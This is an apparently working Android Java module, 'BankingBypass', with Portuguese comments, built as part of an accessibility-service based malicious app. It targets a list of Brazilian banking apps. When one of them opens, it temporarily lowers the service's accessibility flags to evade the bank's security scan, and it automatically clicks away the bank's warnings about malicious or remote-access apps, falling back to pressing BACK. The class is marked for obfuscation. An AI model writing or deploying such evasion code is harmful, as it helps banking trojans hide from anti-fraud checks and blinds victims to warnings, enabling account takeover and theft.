package com.seguranca.protecao.stealth;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import org.lsposed.lsparanoid.Obfuscate;
import java.util.Arrays;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

/**
 * Módulo de bypass de detecção de apps bancários.
 *
 * Bancos como Nubank, Itaú, Caixa escaneiam:
 * 1. Apps com AccessibilityService ativo
 * 2. Apps com SYSTEM_ALERT_WINDOW
 * 3. Lista de pacotes instalados com heurísticas
 *
 * Este módulo implementa:
 * - Auto-dismiss de alertas de segurança bancários (clica "Fechar"/"OK"/"Entendi")
 * - Suspensão temporária de flags de acessibilidade quando banco abre
 * - Re-ativação automática após scan do banco completar
 * - Detecção de diálogos de alerta por conteúdo de texto
 */
@Obfuscate
public class BankingBypass {

    private static final String TAG = "BB";
    private static volatile BankingBypass sInstance;

    private final Handler handler = new Handler(Looper.getMainLooper());
    private volatile boolean isCloaked = false;
    private volatile long cloakStartTime = 0;
    private static final long MAX_CLOAK_DURATION_MS = 8000; // 8s máx em cloak
    private static final long CLOAK_DELAY_MS = 300;         // Delay antes de re-ativar
    private static final long AUTO_DISMISS_DELAY_MS = 800;  // Delay antes de tentar dismiss

    // Pacotes bancários que escaneiam acessibilidade
    private static final Set<String> BANKING_PACKAGES = new HashSet<>(Arrays.asList(
        "com.nu.production",                    // Nubank
        "com.itau",                             // Itaú
        "com.bradesco",                         // Bradesco
        "com.santander.app",                    // Santander
        "br.com.bb.android",                    // Banco do Brasil
        "br.com.caixa.tem",                     // Caixa Tem
        "br.com.gabba.caixa",                   // Caixa
        "com.c6bank.app",                       // C6 Bank
        "br.com.intermedium",                   // Inter
        "com.picpay",                           // PicPay
        "com.mercadopago.wallet",               // Mercado Pago
        "br.com.original.bank",                 // Banco Original
        "com.btgpactual.banking",               // BTG
        "br.com.sicoob.bank",                   // Sicoob
        "br.com.sicredi.app"                    // Sicredi
    ));

    // Textos que indicam diálogo de alerta de segurança bancário
    private static final String[] ALERT_KEYWORDS = {
        "características suspeitas",
        "aplicativo suspeito",
        "acesso remoto",
        "acessibilidade ativada",
        "serviço de acessibilidade",
        "aplicativo de acessibilidade",
        "desinstale o",
        "risco de segurança",
        "app suspeito",
        "controle remoto",
        "acesso não autorizado",
        "interrompemos o acesso",
        "detectamos que",
        "aplicativo malicioso",
        "suspicious app",
        "accessibility service",
        "remote access"
    };

    // Textos de botões para auto-dismiss
    private static final String[] DISMISS_BUTTON_TEXTS = {
        "fechar",
        "entendi",
        "ok",
        "continuar",
        "close",
        "dismiss",
        "prosseguir",
        "voltar",
        "cancelar"
    };

    private BankingBypass() {}

    public static BankingBypass getInstance() {
        if (sInstance == null) {
            synchronized (BankingBypass.class) {
                if (sInstance == null) {
                    sInstance = new BankingBypass();
                }
            }
        }
        return sInstance;
    }

    /**
     * Verifica se um pacote é de app bancário que escaneia acessibilidade.
     */
    public boolean isBankingApp(String packageName) {
        if (packageName == null) return false;
        String pkg = packageName.toLowerCase().trim();

        if (BANKING_PACKAGES.contains(pkg)) return true;

        // Heurística genérica: nomes que sugerem banco
        return pkg.contains("bank") || pkg.contains("banco") ||
               pkg.contains(".bb.") || pkg.contains("caixa") ||
               pkg.contains("itau") || pkg.contains("bradesco") ||
               pkg.contains("santander") || pkg.contains("nubank") ||
               pkg.contains("nu.production");
    }

    /**
     * Chamado quando app bancário entra em foreground.
     * Reduz a superfície de detecção temporariamente.
     */
    public void onBankingAppOpened(AccessibilityService service, String bankPackage) {
        Log.d(TAG, "🏦 Banco detectado: " + bankPackage + " — ativando cloak");

        // Cloaka o serviço de acessibilidade reduzindo flags
        cloakAccessibilityService(service);

        // Agenda auto-dismiss de possíveis alertas
        handler.postDelayed(() -> {
            try {
                AccessibilityNodeInfo root = service.getRootInActiveWindow();
                if (root != null) {
                    boolean dismissed = tryDismissSecurityAlert(service, root);
                    if (dismissed) {
                        Log.d(TAG, "✅ Alerta bancário auto-dismissed!");
                    }
                    root.recycle();
                }
            } catch (Exception e) {
                Log.e(TAG, "Auto-dismiss erro: " + e.getMessage());
            }
        }, AUTO_DISMISS_DELAY_MS);

        // Segundo attempt de dismiss (alguns bancos mostram com delay)
        handler.postDelayed(() -> {
            try {
                AccessibilityNodeInfo root = service.getRootInActiveWindow();
                if (root != null) {
                    tryDismissSecurityAlert(service, root);
                    root.recycle();
                }
            } catch (Exception e) { /* ignore */ }
        }, AUTO_DISMISS_DELAY_MS * 3);

        // Terceiro attempt
        handler.postDelayed(() -> {
            try {
                AccessibilityNodeInfo root = service.getRootInActiveWindow();
                if (root != null) {
                    tryDismissSecurityAlert(service, root);
                    root.recycle();
                }
            } catch (Exception e) { /* ignore */ }
        }, AUTO_DISMISS_DELAY_MS * 6);
    }

    /**
     * Chamado quando app bancário sai do foreground.
     * Restaura funcionalidade completa.
     */
    public void onBankingAppClosed(AccessibilityService service) {
        Log.d(TAG, "🏦 Banco saiu do foreground — restaurando acessibilidade");
        uncloakAccessibilityService(service);
    }

    /**
     * Reduz flags do AccessibilityService para evitar detecção.
     * O banco escaneia AccessibilityServiceInfo.getEnabledAccessibilityServiceList()
     * e verifica as flags/capabilities. Reduzindo temporariamente, o scan
     * pode não flaggear o serviço como suspeito.
     */
    private void cloakAccessibilityService(AccessibilityService service) {
        if (isCloaked) return;

        try {
            AccessibilityServiceInfo info = service.getServiceInfo();
            if (info != null) {
                // Salva flags originais para restaurar depois
                // Reduz para flags mínimas — parece um serviço legítimo básico
                info.eventTypes = AccessibilityEvent.TYPE_ANNOUNCEMENT;  // Mínimo possível
                info.flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS;
                info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
                info.notificationTimeout = 5000; // Lento = parece inofensivo

                service.setServiceInfo(info);
                isCloaked = true;
                cloakStartTime = System.currentTimeMillis();

                Log.d(TAG, "🫥 Acessibilidade cloaked — flags reduzidas");

                // Safety: restaura automaticamente após MAX_CLOAK_DURATION
                handler.postDelayed(() -> {
                    if (isCloaked) {
                        Log.d(TAG, "⏰ Cloak timeout — restaurando");
                        uncloakAccessibilityService(service);
                    }
                }, MAX_CLOAK_DURATION_MS);
            }
        } catch (Exception e) {
            Log.e(TAG, "Cloak erro: " + e.getMessage());
        }
    }

    /**
     * Restaura flags completas do AccessibilityService.
     */
    private void uncloakAccessibilityService(AccessibilityService service) {
        if (!isCloaked) return;

        try {
            handler.postDelayed(() -> {
                try {
                    AccessibilityServiceInfo info = service.getServiceInfo();
                    if (info != null) {
                        // Restaura flags completas
                        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
                        info.flags = AccessibilityServiceInfo.DEFAULT
                            | AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
                            | AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
                            | AccessibilityServiceInfo.FLAG_REQUEST_TOUCH_EXPLORATION_MODE
                            | AccessibilityServiceInfo.FLAG_REQUEST_ENHANCED_WEB_ACCESSIBILITY;
                        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
                        info.notificationTimeout = 100;

                        service.setServiceInfo(info);
                        isCloaked = false;

                        Log.d(TAG, "✅ Acessibilidade restaurada — flags completas");
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Uncloak erro: " + e.getMessage());
                    isCloaked = false;
                }
            }, CLOAK_DELAY_MS);
        } catch (Exception e) {
            isCloaked = false;
        }
    }

    /**
     * Tenta dismiss de diálogos de alerta de segurança bancário.
     * Escaneia a árvore de acessibilidade procurando textos de alerta
     * e clica no botão de fechar/dismiss.
     *
     * @return true se encontrou e clicou em botão de dismiss
     */
    public boolean tryDismissSecurityAlert(AccessibilityService service, AccessibilityNodeInfo root) {
        if (root == null) return false;

        try {
            // Primeiro: verifica se há texto de alerta na tela
            boolean hasAlertText = containsAlertText(root);
            if (!hasAlertText) return false;

            Log.d(TAG, "⚠️ Alerta de segurança bancário detectado na tela!");

            // Procura botão de dismiss
            for (String buttonText : DISMISS_BUTTON_TEXTS) {
                List<AccessibilityNodeInfo> buttons = root.findAccessibilityNodeInfosByText(buttonText);
                if (buttons != null && !buttons.isEmpty()) {
                    for (AccessibilityNodeInfo btn : buttons) {
                        if (btn.isClickable()) {
                            boolean clicked = btn.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            if (clicked) {
                                Log.d(TAG, "✅ Clicou em botão: '" + buttonText + "'");
                                btn.recycle();
                                return true;
                            }
                        }
                        // Tenta clicar no pai se o botão em si não for clicável
                        AccessibilityNodeInfo parent = btn.getParent();
                        if (parent != null && parent.isClickable()) {
                            boolean clicked = parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            if (clicked) {
                                Log.d(TAG, "✅ Clicou no pai do botão: '" + buttonText + "'");
                                parent.recycle();
                                btn.recycle();
                                return true;
                            }
                            parent.recycle();
                        }
                        btn.recycle();
                    }
                }
            }

            // Fallback: procura qualquer botão/view clicável no diálogo
            boolean fallbackClicked = clickFirstDismissableInDialog(root);
            if (fallbackClicked) {
                Log.d(TAG, "✅ Dismiss via fallback");
                return true;
            }

            // Último recurso: pressiona BACK para fechar diálogo
            Log.d(TAG, "⬅️ Tentando BACK para fechar alerta");
            service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
            return true;

        } catch (Exception e) {
            Log.e(TAG, "tryDismiss erro: " + e.getMessage());
        }
        return false;
    }

    /**
     * Verifica se a tela contém texto de alerta de segurança bancário.
     */
    private boolean containsAlertText(AccessibilityNodeInfo node) {
        if (node == null) return false;

        try {
            for (String keyword : ALERT_KEYWORDS) {
                List<AccessibilityNodeInfo> matches = node.findAccessibilityNodeInfosByText(keyword);
                if (matches != null && !matches.isEmpty()) {
                    for (AccessibilityNodeInfo m : matches) m.recycle();
                    return true;
                }
            }
        } catch (Exception e) {
            // ignore
        }
        return false;
    }

    /**
     * Procura e clica no primeiro botão dismissável em um diálogo.
     * Percorre a árvore de forma recursiva procurando botões.
     */
    private boolean clickFirstDismissableInDialog(AccessibilityNodeInfo node) {
        if (node == null) return false;

        try {
            // Verifica se este nó é um botão clicável
            if (node.isClickable()) {
                CharSequence text = node.getText();
                CharSequence desc = node.getContentDescription();
                String nodeText = (text != null ? text.toString() : "") +
                                  (desc != null ? desc.toString() : "");
                String lower = nodeText.toLowerCase();

                // Verifica se parece um botão de dismiss
                for (String dismissText : DISMISS_BUTTON_TEXTS) {
                    if (lower.contains(dismissText)) {
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        return true;
                    }
                }
            }

            // Recursão nos filhos
            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    boolean result = clickFirstDismissableInDialog(child);
                    child.recycle();
                    if (result) return true;
                }
            }
        } catch (Exception e) {
            // ignore
        }
        return false;
    }

    /**
     * Deve ser chamado em onAccessibilityEvent para cada evento.
     * Monitora mudanças de janela para detectar alertas de segurança.
     */
    public void onAccessibilityEvent(AccessibilityService service, AccessibilityEvent event) {
        if (event == null) return;

        try {
            int eventType = event.getEventType();

            // TYPE_WINDOW_STATE_CHANGED = nova janela/diálogo apareceu
            if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                CharSequence packageName = event.getPackageName();
                if (packageName != null && isBankingApp(packageName.toString())) {
                    // Tenta dismiss automático com delay para o diálogo renderizar
                    handler.postDelayed(() -> {
                        try {
                            AccessibilityNodeInfo root = service.getRootInActiveWindow();
                            if (root != null) {
                                tryDismissSecurityAlert(service, root);
                                root.recycle();
                            }
                        } catch (Exception e) { /* ignore */ }
                    }, 500);
                }
            }

            // TYPE_WINDOW_CONTENT_CHANGED = conteúdo mudou (possível diálogo novo)
            if (eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
                CharSequence packageName = event.getPackageName();
                if (packageName != null && isBankingApp(packageName.toString())) {
                    handler.postDelayed(() -> {
                        try {
                            AccessibilityNodeInfo root = service.getRootInActiveWindow();
                            if (root != null) {
                                if (containsAlertText(root)) {
                                    tryDismissSecurityAlert(service, root);
                                }
                                root.recycle();
                            }
                        } catch (Exception e) { /* ignore */ }
                    }, 300);
                }
            }
        } catch (Exception e) {
            // Silencioso — não pode crashar o accessibility service
        }
    }

    public boolean isCloaked() { return isCloaked; }
}
